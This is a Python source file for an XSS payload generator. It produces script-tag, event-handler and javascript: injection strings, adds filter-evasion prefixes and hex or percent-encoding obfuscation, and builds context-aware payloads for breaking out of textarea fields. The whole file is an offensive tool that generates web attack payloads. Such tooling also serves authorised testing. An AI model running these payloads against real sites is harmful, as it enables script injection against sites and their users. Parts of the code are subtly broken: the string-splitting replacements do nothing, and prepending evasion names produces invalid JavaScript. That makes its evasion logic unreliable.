import random
from typing import List
import json
import os

class PayloadGenerator:
    def __init__(self):
        self.base_payloads = [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "javascript:alert(1)",
            "onerror=alert(1)",
            "onload=alert(1)"
        ]
        self.evasion_techniques = [
            "String.fromCharCode",
            "eval(atob('YWxlcnQoMSk='))",
            "setTimeout('alert\\x281\\x29',0)"
        ]
        self.obfuscation_methods = [
            lambda x: x.replace("alert", "al"+"ert"),
            lambda x: x.replace("script", "scr"+"ipt"),
            lambda x: x.encode('utf-8').hex(),
            lambda x: ''.join([f"\\x{ord(c):02x}" for c in x]),
            lambda x: ''.join([f"%{ord(c):02x}" for c in x])
        ]

    def generate_payloads(self, count: int = 100) -> List[str]:
        payloads = set()
        while len(payloads) < count:
            base = random.choice(self.base_payloads)
            if random.random() > 0.7:  # 30% chance to apply evasion
                base = random.choice(self.evasion_techniques) + base
            if random.random() > 0.5:  # 50% chance to apply obfuscation
                base = random.choice(self.obfuscation_methods)(base)
            payloads.add(base)
        return list(payloads)

    def load_custom_payloads(self, file_path: str) -> List[str]:
        if os.path.exists(file_path):
            with open(file_path, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        return []

    def generate_context_aware_payloads(self, context: dict) -> List[str]:
        """Generate payloads based on input context (type, attributes)"""
        payloads = []
        if context.get('type') == 'textarea':
            payloads.extend([
                "</textarea><script>alert(1)</script>",
                "<textarea onmouseover=alert(1)>"
            ])
        if 'src' in context.get('attributes', []):
            payloads.append("javascript:alert(1)")
        return payloads + self.generate_payloads(10)
